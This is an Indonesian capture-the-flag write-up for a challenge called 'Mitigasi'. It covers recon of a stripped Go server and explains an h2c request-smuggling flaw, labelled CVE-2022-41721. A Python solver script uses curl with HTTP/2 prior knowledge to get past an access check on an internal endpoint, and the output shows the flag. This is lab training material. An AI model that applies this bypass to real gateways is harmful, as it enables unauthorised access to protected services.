# WriteUp - Mitigasi

## Overview

* **Judul:** Mitigasi
* **Kategori:** HTTP Protocol / Cve
* **Poin:** 160
* **Deskripsi:** Tim DevOps baru saja meluncurkan API Gateway internal untuk menangani komunikasi microservice dengan performa tinggi. Gateway ini mendukung HTTP/1.1 dan HTTP/2 cleartext (h2c) untuk backward compatibility dengan legacy services. Sebagai bagian dari hardening keamanan, tim mengimplementasikan proteksi terhadap serangan Denial of Service dengan membatasi ukuran request body. Namun, ada rumor bahwa "mitigasi" ini justru membuka celah yang lebih serius... Bisakah kamu mengakses endpoint `/api/internal/status`?
* **Author:** -
* **URL:** `http://localhost:1337`

## Attachment Information & Directory Structure

Konfigurasi awal lingkungan Docker dari file attachment `mitigasi.yml` dan hasil enumerasi direktori serta *binary* di dalam kontainer.

```bash
▶  docker exec mitigasi-web-1 ls -la
total 4964
drwxr-xr-x    1 root     root          4096 Mar  1 04:46 .
drwxr-xr-x    1 root     root          4096 Mar  1 04:46 ..
-rwxr-xr-x    1 root     root       5074944 Feb 28 09:10 server

▶  file server
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=XP5NnS-rUa5dqZ_4jyh8/MUL3Gl2RFYfgDzWzK8qG/T32oX9j8wy6a-zgjl04T/8zSSNg9vgFEaLiJQlAiB, stripped

▶  checksec --file=server
[*] '/home/wanzkey/Pwn The Website/HTTP Protocol/Mitigasi/server'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

```

## Proses Penyelesaian

### 1. Reconnaissance & Analisis Binary (Reverse Engineering)

Meskipun *binary* di-*compile* secara statis dan di-*strip* (tidak ada *symbol table* yang terdeteksi di GDB), penggunaan perintah `strings` yang difilter dengan kata kunci `main.` berhasil mengekstrak informasi krusial mengenai struktur kode Golang yang berjalan:

```bash
▶  strings server | grep "main."
...
net/http.requestBodyRemains
main.logRequest
main.apiDataHandler
main.internalFlagHandler
main.debugRequestsHandler
main.main.MaxBytesHandler.func1
...

```

Keberadaan `main.internalFlagHandler` menegaskan *endpoint* rahasia yang menjadi target, sedangkan `main.main.MaxBytesHandler.func1` mengindikasikan adanya *middleware* pembatas ukuran *body request* (`http.MaxBytesHandler`) yang membungkus *handler* utama.

### 2. Identifikasi Kerentanan & Informasi CVE (CVE-2022-41721)

Deskripsi tantangan menyebutkan bahwa API Gateway ini mendukung **HTTP/2 cleartext (h2c)** dan di- *harden* menggunakan **mitigasi batasan ukuran request body**. Kombinasi spesifik dari `h2c.NewHandler` dan `http.MaxBytesHandler` di Golang merupakan kerentanan fatal yang diidentifikasi sebagai **CVE-2022-41721**.

**Detail CVE-2022-41721 (h2c Request Smuggling):**

* Pada implementasi normal, *middleware* otorisasi (ACL) diletakkan di depan *handler* untuk memblokir akses HTTP/1.1 ke `/api/internal/status`.
* Namun, aplikasi juga menggunakan pustaka `golang.org/x/net/http2/h2c` untuk mendukung *upgrade* koneksi dari HTTP/1.1 ke HTTP/2 (h2c).
* Kerentanan terjadi ketika `h2c.NewHandler` dieksekusi. Jika *client* mengirimkan *request* menggunakan metode **HTTP/2 Prior Knowledge** (memaksa komunikasi HTTP/2 langsung sejak awal TCP *handshake* tanpa proses *upgrade* HTTP/1.1), *handler* h2c internal Golang akan mengambil alih (*hijack*) koneksi TCP mentah tersebut.
* Akibatnya, koneksi di-*bypass* melewati lapisan *middleware* terluar (seperti ACL yang melarang akses ke endpoint admin dan mitigasi `MaxBytesHandler`) dan langsung dieksekusi oleh *multiplexer* internal.

### 3. Eksploitasi

Karena akses langsung menggunakan protokol HTTP/1.1 biasa mengembalikan status `403 Forbidden`, serangan dilancarkan dengan memanipulasi *request* agar menggunakan protokol HTTP/2 secara paksa (*Prior Knowledge*).

Hal ini dapat dicapai menggunakan utilitas `curl` dengan flag `--http2-prior-knowledge` yang menginstruksikan `curl` untuk langsung mengirim *magic byte* HTTP/2 dan *frame settings* ke port tanpa negosiasi HTTP/1.1. Server yang rentan terhadap CVE-2022-41721 akan memproses *request* tersebut secara internal, mengabaikan blokir ACL, dan merender respon dari `/api/internal/status`.

## Script Solver

```python
import subprocess
import time

BASE_URL = "http://localhost:1337"

def exploit():
    print("[*] Starting Mitigasi Gateway Exploit (CVE-2022-41721 / h2c Smuggling)...")
    
    print("\n[*] 1. Mencoba akses normal via HTTP/1.1 (Recon)...")
    cmd_normal = ["curl", "-s", "-w", "\nHTTP_CODE: %{http_code}", f"{BASE_URL}/api/internal/status"]
    res_normal = subprocess.run(cmd_normal, capture_output=True, text=True)
    print(res_normal.stdout.strip())
    
    print("\n[*] 2. Executing h2c Prior-Knowledge Bypass...")
    time.sleep(1)
    
    cmd_h2c = [
        "curl", "-s", "-i", 
        "--http2-prior-knowledge", 
        f"{BASE_URL}/api/internal/status"
    ]
    
    try:
        res_h2c = subprocess.run(cmd_h2c, capture_output=True, text=True)
        
        print("\n" + "="*40)
        print("[+] SERVER RESPONSE (H2C BYPASS):")
        print(res_h2c.stdout.strip())
        print("="*40)
        
        if "pwn{" in res_h2c.stdout:
            print("\n[+] Voila! Flag ditemukan!")
        else:
            print("\n[-] Flag belum ketemu. Cek log server jika ada error.")
            
    except Exception as e:
        print(f"[-] Error saat menjalankan curl: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Script

```bash
▶  ./exploit.py
[*] Starting Mitigasi Gateway Exploit (CVE-2022-41721 / h2c Smuggling)...

[*] 1. Mencoba akses normal via HTTP/1.1 (Recon)...
Forbidden

HTTP_CODE: 403

[*] 2. Executing h2c Prior-Knowledge Bypass...

========================================
[+] SERVER RESPONSE (H2C BYPASS):
HTTP/2 200
content-type: application/json
content-length: 63
date: Sun, 01 Mar 2026 04:57:30 GMT

{"status":"ok","flag":"pwn{363baf23640d28e6208c29a5d90151c6}
"}
========================================

[+] Voila! Flag ditemukan!

```

## Flag

```
pwn{363baf23640d28e6208c29a5d90151c6}

```

